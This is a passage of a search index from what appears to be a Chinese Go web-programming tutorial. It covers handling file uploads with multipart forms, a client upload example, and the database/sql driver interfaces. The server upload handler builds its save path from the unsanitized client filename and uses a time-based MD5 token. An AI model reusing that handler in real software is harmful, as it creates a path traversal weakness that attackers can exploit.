\u5904\u7406\u6587\u4ef6\u4e0a\u4f20","text":"<p>\u4f60\u60f3\u5904\u7406\u4e00\u4e2a\u7531\u7528\u6237\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u6bd4\u5982\u4f60\u6b63\u5728\u5efa\u8bbe\u4e00\u4e2a\u7c7b\u4f3cInstagram\u7684\u7f51\u7ad9\uff0c\u4f60\u9700\u8981\u5b58\u50a8\u7528\u6237\u62cd\u6444\u7684\u7167\u7247\u3002\u8fd9\u79cd\u9700\u6c42\u8be5\u5982\u4f55\u5b9e\u73b0\u5462\uff1f</p> <p>\u8981\u4f7f\u8868\u5355\u80fd\u591f\u4e0a\u4f20\u6587\u4ef6\uff0c\u9996\u5148\u7b2c\u4e00\u6b65\u5c31\u662f\u8981\u6dfb\u52a0form\u7684<code>enctype</code>\u5c5e\u6027\uff0c<code>enctype</code>\u5c5e\u6027\u6709\u5982\u4e0b\u4e09\u79cd\u60c5\u51b5: <pre><code>application/x-www-form-urlencoded   \u8868\u793a\u5728\u53d1\u9001\u524d\u7f16\u7801\u6240\u6709\u5b57\u7b26\uff08\u9ed8\u8ba4\uff09\nmultipart/form-data   \u4e0d\u5bf9\u5b57\u7b26\u7f16\u7801\u3002\u5728\u4f7f\u7528\u5305\u542b\u6587\u4ef6\u4e0a\u4f20\u63a7\u4ef6\u7684\u8868\u5355\u65f6\uff0c\u5fc5\u987b\u4f7f\u7528\u8be5\u503c\u3002\ntext/plain    \u7a7a\u683c\u8f6c\u6362\u4e3a \"+\" \u52a0\u53f7\uff0c\u4f46\u4e0d\u5bf9\u7279\u6b8a\u5b57\u7b26\u7f16\u7801\u3002\n</code></pre> \u6240\u4ee5\uff0c\u521b\u5efa\u65b0\u7684\u8868\u5355html\u6587\u4ef6, \u547d\u540d\u4e3aupload.gtpl, html\u4ee3\u7801\u5e94\u8be5\u7c7b\u4f3c\u4e8e: <pre><code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;\u4e0a\u4f20\u6587\u4ef6&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form enctype=\"multipart/form-data\" action=\"/upload\" method=\"post\"&gt;\n  &lt;input type=\"file\" name=\"uploadfile\" /&gt;\n  &lt;input type=\"hidden\" name=\"token\" value=\"{{.}}\"/&gt;\n  &lt;input type=\"submit\" value=\"upload\" /&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> \u5728\u670d\u52a1\u5668\u7aef\uff0c\u6211\u4eec\u589e\u52a0\u4e00\u4e2ahandlerFunc: <pre><code>http.HandleFunc(\"/upload\", upload)\n\n// \u5904\u7406/upload \u903b\u8f91\nfunc upload(w http.ResponseWriter, r *http.Request) {\nfmt.Println(\"method:\", r.Method) //\u83b7\u53d6\u8bf7\u6c42\u7684\u65b9\u6cd5\nif r.Method == \"GET\" {\ncrutime := time.Now().Unix()\nh := md5.New()\nio.WriteString(h, strconv.FormatInt(crutime, 10))\ntoken := fmt.Sprintf(\"%x\", h.Sum(nil))\n\nt, _ := template.ParseFiles(\"upload.gtpl\")\nt.Execute(w, token)\n} else {\nr.ParseMultipartForm(32 &lt;&lt; 20)\nfile, handler, err := r.FormFile(\"uploadfile\")\nif err != nil {\nfmt.Println(err)\nreturn\n}\ndefer file.Close()\nfmt.Fprintf(w, \"%v\", handler.Header)\nf, err := os.OpenFile(\"./test/\"+handler.Filename, os.O_WRONLY|os.O_CREATE, 0666)  // \u6b64\u5904\u5047\u8bbe\u5f53\u524d\u76ee\u5f55\u4e0b\u5df2\u5b58\u5728test\u76ee\u5f55\nif err != nil {\nfmt.Println(err)\nreturn\n}\ndefer f.Close()\nio.Copy(f, file)\n}\n}\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\uff0c\u5904\u7406\u6587\u4ef6\u4e0a\u4f20\u6211\u4eec\u9700\u8981\u8c03\u7528<code>r.ParseMultipartForm</code>\uff0c\u91cc\u9762\u7684\u53c2\u6570\u8868\u793a<code>maxMemory</code>\uff0c\u8c03\u7528<code>ParseMultipartForm</code>\u4e4b\u540e\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\u5b58\u50a8\u5728<code>maxMemory</code>\u5927\u5c0f\u7684\u5185\u5b58\u91cc\u9762\uff0c\u5982\u679c\u6587\u4ef6\u5927\u5c0f\u8d85\u8fc7\u4e86<code>maxMemory</code>\uff0c\u90a3\u4e48\u5269\u4e0b\u7684\u90e8\u5206\u5c06\u5b58\u50a8\u5728\u7cfb\u7edf\u7684\u4e34\u65f6\u6587\u4ef6\u4e2d\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>r.FormFile</code>\u83b7\u53d6\u4e0a\u9762\u7684\u6587\u4ef6\u53e5\u67c4\uff0c\u7136\u540e\u5b9e\u4f8b\u4e2d\u4f7f\u7528\u4e86<code>io.Copy</code>\u6765\u5b58\u50a8\u6587\u4ef6\u3002</p> <p>\u83b7\u53d6\u5176\u4ed6\u975e\u6587\u4ef6\u5b57\u6bb5\u4fe1\u606f\u7684\u65f6\u5019\u5c31\u4e0d\u9700\u8981\u8c03\u7528<code>r.ParseForm</code>\uff0c\u56e0\u4e3a\u5728\u9700\u8981\u7684\u65f6\u5019Go\u81ea\u52a8\u4f1a\u53bb\u8c03\u7528\u3002\u800c\u4e14<code>ParseMultipartForm</code>\u8c03\u7528\u4e00\u6b21\u4e4b\u540e\uff0c\u540e\u9762\u518d\u6b21\u8c03\u7528\u4e0d\u4f1a\u518d\u6709\u6548\u679c\u3002</p> <p>\u901a\u8fc7\u4e0a\u9762\u7684\u5b9e\u4f8b\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u4e0a\u4f20\u6587\u4ef6\u4e3b\u8981\u4e09\u6b65\u5904\u7406\uff1a</p> <ol> <li>\u8868\u5355\u4e2d\u589e\u52a0enctype=\"multipart/form-data\"</li> <li>\u670d\u52a1\u7aef\u8c03\u7528<code>r.ParseMultipartForm</code>,\u628a\u4e0a\u4f20\u7684\u6587\u4ef6\u5b58\u50a8\u5728\u5185\u5b58\u548c\u4e34\u65f6\u6587\u4ef6\u4e2d</li> <li>\u4f7f\u7528<code>r.FormFile</code>\u83b7\u53d6\u6587\u4ef6\u53e5\u67c4\uff0c\u7136\u540e\u5bf9\u6587\u4ef6\u8fdb\u884c\u5b58\u50a8\u7b49\u5904\u7406\u3002</li> </ol> <p>\u6587\u4ef6handler\u662fmultipart.FileHeader,\u91cc\u9762\u5b58\u50a8\u4e86\u5982\u4e0b\u7ed3\u6784\u4fe1\u606f <pre><code>type FileHeader struct {\nFilename string\nHeader   textproto.MIMEHeader\n// contains filtered or unexported fields\n}\n</code></pre> \u6211\u4eec\u901a\u8fc7\u4e0a\u9762\u7684\u5b9e\u4f8b\u4ee3\u7801\u6253\u5370\u51fa\u6765\u4e0a\u4f20\u6587\u4ef6\u7684\u4fe1\u606f\u5982\u4e0b</p> <p></p> <p>\u56fe4.5 \u6253\u5370\u6587\u4ef6\u4e0a\u4f20\u540e\u670d\u52a1\u5668\u7aef\u63a5\u53d7\u7684\u4fe1\u606f</p>"},{"location":"04.5/#_1","title":"\u5ba2\u6237\u7aef\u4e0a\u4f20\u6587\u4ef6","text":"<p>\u6211\u4eec\u4e0a\u9762\u7684\u4f8b\u5b50\u6f14\u793a\u4e86\u5982\u4f55\u901a\u8fc7\u8868\u5355\u4e0a\u4f20\u6587\u4ef6\uff0c\u7136\u540e\u5728\u670d\u52a1\u5668\u7aef\u5904\u7406\u6587\u4ef6\uff0c\u5176\u5b9eGo\u652f\u6301\u6a21\u62df\u5ba2\u6237\u7aef\u8868\u5355\u529f\u80fd\u652f\u6301\u6587\u4ef6\u4e0a\u4f20\uff0c\u8be6\u7ec6\u7528\u6cd5\u8bf7\u770b\u5982\u4e0b\u793a\u4f8b\uff1a <pre><code>package main\n\nimport (\n\"bytes\"\n\"fmt\"\n\"io\"\n\"io/ioutil\"\n\"mime/multipart\"\n\"net/http\"\n\"os\"\n)\n\nfunc postFile(filename string, targetUrl string) error {\nbodyBuf := &amp;bytes.Buffer{}\nbodyWriter := multipart.NewWriter(bodyBuf)\n\n//\u5173\u952e\u7684\u4e00\u6b65\u64cd\u4f5c\nfileWriter, err := bodyWriter.CreateFormFile(\"uploadfile\", filename)\nif err != nil {\nfmt.Println(\"error writing to buffer\")\nreturn err\n}\n\n//\u6253\u5f00\u6587\u4ef6\u53e5\u67c4\u64cd\u4f5c\nfh, err := os.Open(filename)\nif err != nil {\nfmt.Println(\"error opening file\")\nreturn err\n}\ndefer fh.Close()\n\n//iocopy\n_, err = io.Copy(fileWriter, fh)\nif err != nil {\nreturn err\n}\n\ncontentType := bodyWriter.FormDataContentType()\nbodyWriter.Close()\n\nresp, err := http.Post(targetUrl, contentType, bodyBuf)\nif err != nil {\nreturn err\n}\ndefer resp.Body.Close()\nresp_body, err := ioutil.ReadAll(resp.Body)\nif err != nil {\nreturn err\n}\nfmt.Println(resp.Status)\nfmt.Println(string(resp_body))\nreturn nil\n}\n\n// sample usage\nfunc main() {\ntarget_url := \"http://localhost:9090/upload\"\nfilename := \"./astaxie.pdf\"\npostFile(filename, target_url)\n}\n</code></pre> \u4e0a\u9762\u7684\u4f8b\u5b50\u8be6\u7ec6\u5c55\u793a\u4e86\u5ba2\u6237\u7aef\u5982\u4f55\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u7684\u4f8b\u5b50\uff0c\u5ba2\u6237\u7aef\u901a\u8fc7multipart.Write\u628a\u6587\u4ef6\u7684\u6587\u672c\u6d41\u5199\u5165\u4e00\u4e2a\u7f13\u5b58\u4e2d\uff0c\u7136\u540e\u8c03\u7528http\u7684Post\u65b9\u6cd5\u628a\u7f13\u5b58\u4f20\u5230\u670d\u52a1\u5668\u3002</p> <p>\u5982\u679c\u4f60\u8fd8\u6709\u5176\u4ed6\u666e\u901a\u5b57\u6bb5\u4f8b\u5982username\u4e4b\u7c7b\u7684\u9700\u8981\u540c\u65f6\u5199\u5165\uff0c\u90a3\u4e48\u53ef\u4ee5\u8c03\u7528multipart\u7684WriteField\u65b9\u6cd5\u5199\u5f88\u591a\u5176\u4ed6\u7c7b\u4f3c\u7684\u5b57\u6bb5\u3002</p>"},{"location":"04.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u9632\u6b62\u591a\u6b21\u9012\u4ea4\u8868\u5355</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"04.6/","title":"4.6 \u5c0f\u7ed3","text":"<p>\u8fd9\u4e00\u7ae0\u91cc\u9762\u6211\u4eec\u5b66\u4e60\u4e86Go\u5982\u4f55\u5904\u7406\u8868\u5355\u4fe1\u606f\uff0c\u6211\u4eec\u901a\u8fc7\u7528\u6237\u767b\u5f55\u3001\u4e0a\u4f20\u6587\u4ef6\u7684\u4f8b\u5b50\u5c55\u793a\u4e86Go\u5904\u7406form\u8868\u5355\u4fe1\u606f\u53ca\u4e0a\u4f20\u6587\u4ef6\u7684\u624b\u6bb5\u3002\u4f46\u662f\u5728\u5904\u7406\u8868\u5355\u8fc7\u7a0b\u4e2d\u6211\u4eec\u9700\u8981\u9a8c\u8bc1\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f\uff0c\u8003\u8651\u5230\u7f51\u7ad9\u5b89\u5168\u7684\u91cd\u8981\u6027\uff0c\u6570\u636e\u8fc7\u6ee4\u5c31\u663e\u5f97\u76f8\u5f53\u91cd\u8981\u4e86\uff0c\u56e0\u6b64\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u4e13\u95e8\u5199\u4e86\u4e00\u4e2a\u5c0f\u8282\u6765\u8bb2\u89e3\u4e86\u4e0d\u540c\u65b9\u9762\u7684\u6570\u636e\u8fc7\u6ee4\uff0c\u987a\u5e26\u8bb2\u4e00\u4e0bGo\u5bf9\u5b57\u7b26\u4e32\u7684\u6b63\u5219\u5904\u7406\u3002</p> <p>\u901a\u8fc7\u8fd9\u4e00\u7ae0\u80fd\u591f\u8ba9\u4f60\u4e86\u89e3\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\u662f\u5982\u4f55\u8fdb\u884c\u6570\u636e\u4e0a\u7684\u4ea4\u4e92\uff0c\u5ba2\u6237\u7aef\u5c06\u6570\u636e\u4f20\u9012\u7ed9\u670d\u52a1\u5668\u7cfb\u7edf\uff0c\u670d\u52a1\u5668\u63a5\u53d7\u6570\u636e\u53c8\u628a\u5904\u7406\u7ed3\u679c\u53cd\u9988\u7ed9\u5ba2\u6237\u7aef\u3002</p>"},{"location":"04.6/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u5904\u7406\u6587\u4ef6\u4e0a\u4f20</li> <li>\u4e0b\u4e00\u7ae0: \u8bbf\u95ee\u6570\u636e\u5e93</li> </ul>"},{"location":"05.0/","title":"5 \u8bbf\u95ee\u6570\u636e\u5e93","text":"<p>\u5bf9\u8bb8\u591aWeb\u5e94\u7528\u7a0b\u5e8f\u800c\u8a00\uff0c\u6570\u636e\u5e93\u90fd\u662f\u5176\u6838\u5fc3\u6240\u5728\u3002\u6570\u636e\u5e93\u51e0\u4e4e\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u4f60\u60f3\u67e5\u8be2\u548c\u4fee\u6539\u7684\u4efb\u4f55\u4fe1\u606f\uff0c\u6bd4\u5982\u7528\u6237\u4fe1\u606f\u3001\u4ea7\u54c1\u76ee\u5f55\u6216\u8005\u65b0\u95fb\u5217\u8868\u7b49\u3002</p> <p>Go\u6ca1\u6709\u5185\u7f6e\u7684\u9a71\u52a8\u652f\u6301\u4efb\u4f55\u7684\u6570\u636e\u5e93\uff0c\u4f46\u662fGo\u5b9a\u4e49\u4e86database/sql\u63a5\u53e3\uff0c\u7528\u6237\u53ef\u4ee5\u57fa\u4e8e\u9a71\u52a8\u63a5\u53e3\u5f00\u53d1\u76f8\u5e94\u6570\u636e\u5e93\u7684\u9a71\u52a8\uff0c5.1\u5c0f\u8282\u91cc\u9762\u4ecb\u7ecdGo\u8bbe\u8ba1\u7684\u4e00\u4e9b\u9a71\u52a8\uff0c\u4ecb\u7ecdGo\u662f\u5982\u4f55\u8bbe\u8ba1\u6570\u636e\u5e93\u9a71\u52a8\u63a5\u53e3\u7684\u30025.2\u81f35.4\u5c0f\u8282\u4ecb\u7ecd\u76ee\u524d\u4f7f\u7528\u7684\u6bd4\u8f83\u591a\u7684\u4e00\u4e9b\u5173\u7cfb\u578b\u6570\u636e\u9a71\u52a8\u4ee5\u53ca\u5982\u4f55\u4f7f\u7528\uff0c5.5\u5c0f\u8282\u4ecb\u7ecd\u6211\u81ea\u5df1\u5f00\u53d1\u4e00\u4e2aORM\u5e93\uff0c\u57fa\u4e8edatabase/sql\u6807\u51c6\u63a5\u53e3\u5f00\u53d1\u7684\uff0c\u53ef\u4ee5\u517c\u5bb9\u51e0\u4e4e\u6240\u6709\u652f\u6301database/sql\u7684\u6570\u636e\u5e93\u9a71\u52a8\uff0c\u53ef\u4ee5\u65b9\u4fbf\u7684\u4f7f\u7528Go style\u6765\u8fdb\u884c\u6570\u636e\u5e93\u64cd\u4f5c\u3002</p> <p>\u76ee\u524dNOSQL\u5df2\u7ecf\u6210\u4e3aWeb\u5f00\u53d1\u7684\u4e00\u4e2a\u6f6e\u6d41\uff0c\u5f88\u591a\u5e94\u7528\u91c7\u7528\u4e86NOSQL\u4f5c\u4e3a\u6570\u636e\u5e93\uff0c\u800c\u4e0d\u662f\u4ee5\u524d\u7684\u7f13\u5b58\uff0c5.6\u5c0f\u8282\u5c06\u4ecb\u7ecdMongoDB\u548cRedis\u4e24\u79cdNOSQL\u6570\u636e\u5e93\u3002</p> <p>Go database/sql tutorial \u91cc\u63d0\u4f9b\u4e86\u60ef\u7528\u7684\u8303\u4f8b\u53ca\u8be6\u7ec6\u7684\u8bf4\u660e\u3002</p>"},{"location":"05.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"05.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u56db\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: database/sql\u63a5\u53e3</li> </ul>"},{"location":"05.1/","title":"5.1 database/sql\u63a5\u53e3","text":"<p>Go\u4e0ePHP\u4e0d\u540c\u7684\u5730\u65b9\u662fGo\u5b98\u65b9\u6ca1\u6709\u63d0\u4f9b\u6570\u636e\u5e93\u9a71\u52a8\uff0c\u800c\u662f\u4e3a\u5f00\u53d1\u6570\u636e\u5e93\u9a71\u52a8\u5b9a\u4e49\u4e86\u4e00\u4e9b\u6807\u51c6\u63a5\u53e3\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u6839\u636e\u5b9a\u4e49\u7684\u63a5\u53e3\u6765\u5f00\u53d1\u76f8\u5e94\u7684\u6570\u636e\u5e93\u9a71\u52a8\uff0c\u8fd9\u6837\u505a\u6709\u4e00\u4e2a\u597d\u5904\uff0c\u53ea\u8981\u662f\u6309\u7167\u6807\u51c6\u63a5\u53e3\u5f00\u53d1\u7684\u4ee3\u7801\uff0c \u4ee5\u540e\u9700\u8981\u8fc1\u79fb\u6570\u636e\u5e93\u65f6\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u4fee\u6539\u3002\u90a3\u4e48Go\u90fd\u5b9a\u4e49\u4e86\u54ea\u4e9b\u6807\u51c6\u63a5\u53e3\u5462\uff1f\u8ba9\u6211\u4eec\u6765\u8be6\u7ec6\u7684\u5206\u6790\u4e00\u4e0b   </p>"},{"location":"05.1/#sqlregister","title":"sql.Register","text":"<p>\u8fd9\u4e2a\u5b58\u5728\u4e8edatabase/sql\u7684\u51fd\u6570\u662f\u7528\u6765\u6ce8\u518c\u6570\u636e\u5e93\u9a71\u52a8\u7684\uff0c\u5f53\u7b2c\u4e09\u65b9\u5f00\u53d1\u8005\u5f00\u53d1\u6570\u636e\u5e93\u9a71\u52a8\u65f6\uff0c\u90fd\u4f1a\u5b9e\u73b0init\u51fd\u6570\uff0c\u5728init\u91cc\u9762\u4f1a\u8c03\u7528\u8fd9\u4e2a<code>Register(name string, driver driver.Driver)</code>\u5b8c\u6210\u672c\u9a71\u52a8\u7684\u6ce8\u518c\u3002</p> <p>\u6211\u4eec\u6765\u770b\u4e00\u4e0bmymysql\u3001sqlite3\u7684\u9a71\u52a8\u91cc\u9762\u90fd\u662f\u600e\u4e48\u8c03\u7528\u7684\uff1a <pre><code>//https://github.com/mattn/go-sqlite3\u9a71\u52a8\nfunc init() {\nsql.Register(\"sqlite3\", &amp;SQLiteDriver{})\n}\n\n//https://github.com/mikespook/mymysql\u9a71\u52a8\n// Driver automatically registered in database/sql\nvar d = Driver{proto: \"tcp\", raddr: \"127.0.0.1:3306\"}\nfunc init() {\nRegister(\"SET NAMES utf8\")\nsql.Register(\"mymysql\", &amp;d)\n}\n</code></pre> \u6211\u4eec\u770b\u5230\u7b2c\u4e09\u65b9\u6570\u636e\u5e93\u9a71\u52a8\u90fd\u662f\u901a\u8fc7\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u6765\u6ce8\u518c\u81ea\u5df1\u7684\u6570\u636e\u5e93\u9a71\u52a8\u540d\u79f0\u4ee5\u53ca\u76f8\u5e94\u7684driver\u5b9e\u73b0\u3002\u5728database/sql\u5185\u90e8\u901a\u8fc7\u4e00\u4e2amap\u6765\u5b58\u50a8\u7528\u6237\u5b9a\u4e49\u7684\u76f8\u5e94\u9a71\u52a8\u3002 <pre><code>var drivers = make(map[string]driver.Driver)\n\ndrivers[name] = driver\n</code></pre> \u56e0\u6b64\u901a\u8fc7database/sql\u7684\u6ce8\u518c\u51fd\u6570\u53ef\u4ee5\u540c\u65f6\u6ce8\u518c\u591a\u4e2a\u6570\u636e\u5e93\u9a71\u52a8\uff0c\u53ea\u8981\u4e0d\u91cd\u590d\u3002</p> <p>\u5728\u6211\u4eec\u4f7f\u7528database/sql\u63a5\u53e3\u548c\u7b2c\u4e09\u65b9\u5e93\u7684\u65f6\u5019\u7ecf\u5e38\u770b\u5230\u5982\u4e0b:</p> <pre><code>  import (\n      \"database/sql\"\n      _ \"github.com/mattn/go-sqlite3\"\n  )\n</code></pre> <p>\u65b0\u624b\u90fd\u4f1a\u88ab\u8fd9\u4e2a<code>_</code>\u6240\u8ff7\u60d1\uff0c\u5176\u5b9e\u8fd9\u4e2a\u5c31\u662fGo\u8bbe\u8ba1\u7684\u5de7\u5999\u4e4b\u5904\uff0c\u6211\u4eec\u5728\u53d8\u91cf\u8d4b\u503c\u7684\u65f6\u5019\u7ecf\u5e38\u770b\u5230\u8fd9\u4e2a\u7b26\u53f7\uff0c\u5b83\u662f\u7528\u6765\u5ffd\u7565\u53d8\u91cf\u8d4b\u503c\u7684\u5360\u4f4d\u7b26\uff0c\u90a3\u4e48\u5305\u5f15\u5165\u7528\u5230\u8fd9\u4e2a\u7b26\u53f7\u4e5f\u662f\u76f8\u4f3c\u7684\u4f5c\u7528\uff0c\u8fd9\u513f\u4f7f\u7528<code>_</code>\u7684\u610f\u601d\u662f\u5f15\u5165\u540e\u9762\u7684\u5305\u540d\u800c\u4e0d\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a\u5305\u4e2d\u5b9a\u4e49\u7684\u51fd\u6570\uff0c\u53d8\u91cf\u7b49\u8d44\u6e90\u3002</p> <p>\u6211\u4eec\u57282.3\u8282\u6d41\u7a0b\u548c\u51fd\u6570\u4e00\u8282\u4e2d\u4ecb\u7ecd\u8fc7init\u51fd\u6570\u7684\u521d\u59cb\u5316\u8fc7\u7a0b\uff0c\u5305\u5728\u5f15\u5165\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u8c03\u7528\u5305\u7684init\u51fd\u6570\u4ee5\u5b8c\u6210\u5bf9\u5305\u7684\u521d\u59cb\u5316\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5f15\u5165\u4e0a\u9762\u7684\u6570\u636e\u5e93\u9a71\u52a8\u5305\u4e4b\u540e\u4f1a\u81ea\u52a8\u53bb\u8c03\u7528init\u51fd\u6570\uff0c\u7136\u540e\u5728init\u51fd\u6570\u91cc\u9762\u6ce8\u518c\u8fd9\u4e2a\u6570\u636e\u5e93\u9a71\u52a8\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u63a5\u4e0b\u6765\u7684\u4ee3\u7801\u4e2d\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a\u6570\u636e\u5e93\u9a71\u52a8\u4e86\u3002</p>"},{"location":"05.1/#driverdriver","title":"driver.Driver","text":"<p>Driver\u662f\u4e00\u4e2a\u6570\u636e\u5e93\u9a71\u52a8\u7684\u63a5\u53e3\uff0c\u4ed6\u5b9a\u4e49\u4e86\u4e00\u4e2amethod\uff1a Open(name string)\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u636e\u5e93\u7684Conn\u63a5\u53e3\u3002 <pre><code>type Driver interface {\nOpen(name string) (Conn, error)\n}\n</code></pre> \u8fd4\u56de\u7684Conn\u53ea\u80fd\u7528\u6765\u8fdb\u884c\u4e00\u6b21goroutine\u7684\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u80fd\u628a\u8fd9\u4e2aConn\u5e94\u7528\u4e8eGo\u7684\u591a\u4e2agoroutine\u91cc\u9762\u3002\u5982\u4e0b\u4ee3\u7801\u4f1a\u51fa\u73b0\u9519\u8bef <pre><code>...\ngo goroutineA (Conn)  //\u6267\u884c\u67e5\u8be2\u64cd\u4f5c\ngo goroutineB (Conn)  //\u6267\u884c\u63d2\u5165\u64cd\u4f5c\n...\n</code></pre> \u4e0a\u9762\u8fd9\u6837\u7684\u4ee3\u7801\u53ef\u80fd\u4f1a\u4f7fGo\u4e0d\u77e5\u9053\u67d0\u4e2a\u64cd\u4f5c\u7a76\u7adf\u662f\u7531\u54ea\u4e2agoroutine\u53d1\u8d77\u7684,\u4ece\u800c\u5bfc\u81f4\u6570\u636e\u6df7\u4e71\uff0c\u6bd4\u5982\u53ef\u80fd\u4f1a\u628agoroutineA\u91cc\u9762\u6267\u884c\u7684\u67e5\u8be2\u64cd\u4f5c\u7684\u7ed3\u679c\u8fd4\u56de\u7ed9goroutineB\u4ece\u800c\u4f7fB\u9519\u8bef\u5730\u628a\u6b64\u7ed3\u679c\u5f53\u6210\u81ea\u5df1\u6267\u884c\u7684\u63d2\u5165\u6570\u636e\u3002</p> <p>\u7b2c\u4e09\u65b9\u9a71\u52a8\u90fd\u4f1a\u5b9a\u4e49\u8fd9\u4e2a\u51fd\u6570\uff0c\u5b83\u4f1a\u89e3\u6790name\u53c2\u6570\u6765\u83b7\u53d6\u76f8\u5173\u6570\u636e\u5e93\u7684\u8fde\u63a5\u4fe1\u606f\uff0c\u89e3\u6790\u5b8c\u6210\u540e\uff0c\u5b83\u5c06\u4f7f\u7528\u6b64\u4fe1\u606f\u6765\u521d\u59cb\u5316\u4e00\u4e2aConn\u5e76\u8fd4\u56de\u5b83\u3002</p>"},{"location":"05.1/#driverconn","title":"driver.Conn","text":"<p>Conn\u662f\u4e00\u4e2a\u6570\u636e\u5e93\u8fde\u63a5\u7684\u63a5\u53e3\u5b9a\u4e49\uff0c\u4ed6\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u65b9\u6cd5\uff0c\u8fd9\u4e2aConn\u53ea\u80fd\u5e94\u7528\u5728\u4e00\u4e2agoroutine\u91cc\u9762\uff0c\u4e0d\u80fd\u4f7f\u7528\u5728\u591a\u4e2agoroutine\u91cc\u9762\uff0c\u8be6\u60c5\u8bf7\u53c2\u8003\u4e0a\u9762\u7684\u8bf4\u660e\u3002 <pre><code>type Conn interface {\nPrepare(query string) (Stmt, error)\nClose() error\nBegin() (Tx, error)\n}\n</code></pre> Prepare\u51fd\u6570\u8fd4\u56de\u4e0e\u5f53\u524d\u8fde\u63a5\u76f8\u5173\u7684\u6267\u884cSql\u8bed\u53e5\u7684\u51c6\u5907\u72b6\u6001\uff0c\u53ef\u4ee5\u8fdb\u884c\u67e5\u8be2\u3001\u5220\u9664\u7b49\u64cd\u4f5c\u3002</p> <p>Close\u51fd\u6570\u5173\u95ed\u5f53\u524d\u7684\u8fde\u63a5\uff0c\u6267\u884c\u91ca\u653e\u8fde\u63a5\u62e5\u6709\u7684\u8d44\u6e90\u7b49\u6e05\u7406\u5de5\u4f5c\u3002\u56e0\u4e3a\u9a71\u52a8\u5b9e\u73b0\u4e86database/sql\u91cc\u9762\u5efa\u8bae\u7684conn pool\uff0c\u6240\u4ee5\u4f60\u4e0d\u7528\u518d\u53bb\u5b9e\u73b0\u7f13\u5b58conn\u4e4b\u7c7b\u7684\uff0c\u8fd9\u6837\u4f1a\u5bb9\u6613\u5f15\u8d77\u95ee\u9898\u3002</p> <p>Begin\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u4ee3\u8868\u4e8b\u52a1\u5904\u7406\u7684Tx\uff0c\u901a\u8fc7\u5b83\u4f60\u53ef\u4ee5\u8fdb\u884c\u67e5\u8be2,\u66f4\u65b0\u7b49\u64cd\u4f5c\uff0c\u6216\u8005\u5bf9\u4e8b\u52a1\u8fdb\u884c\u56de\u6eda\u3001\u9012\u4ea4\u3002</p>"},{"location":"05.1/#driverstmt","title":"driver.Stmt","text":"<p>Stmt\u662f\u4e00\u79cd\u51c6\u5907\u597d\u7684\u72b6\u6001\uff0c\u548cConn\u76f8\u5173\u8054\uff0c\u800c\u4e14\u53ea\u80fd\u5e94\u7528\u4e8e\u4e00\u4e2agoroutine\u4e2d\uff0c\u4e0d\u80fd\u5e94\u7528\u4e8e\u591a\u4e2agoroutine\u3002 <pre><code>type Stmt interface {\nClose() error\nNumInput() int\nExec(args []Value) (Result, error)\nQuery(args []Value) (Rows, error)\n}\n</code></pre> Close\u51fd\u6570\u5173\u95ed\u5f53\u524d\u7684\u94fe\u63a5\u72b6\u6001\uff0c\u4f46\u662f\u5982\u679c\u5f53\u524d\u6b63\u5728\u6267\u884cquery\uff0cquery\u8fd8\u662f\u6709\u6548\u8fd4\u56derows\u6570\u636e\u3002</p> <p>NumInput\u51fd\u6570\u8fd4\u56de\u5f53\u524d\u9884\u7559\u53c2\u6570\u7684\u4e2a\u6570\uff0c\u5f53\u8fd4\u56de&gt;=0\u65f6\u6570\u636e\u5e93\u9a71\u52a8\u5c31\u4f1a\u667a\u80fd\u68c0\u67e5\u8c03\u7528\u8005\u7684\u53c2\u6570\u3002\u5f53\u6570\u636e\u5e93\u9a71\u52a8\u5305\u4e0d\u77e5\u9053\u9884\u7559\u53c2\u6570\u7684\u65f6\u5019\uff0c\u8fd4\u56de-1\u3002</p> <p>Exec\u51fd\u6570\u6267\u884cPrepare\u51c6\u5907\u597d\u7684sql\uff0c\u4f20\u5165\u53c2\u6570\u6267\u884cupdate/insert\u7b49\u64cd\u4f5c\uff0c\u8fd4\u56deResult\u6570\u636e</p> 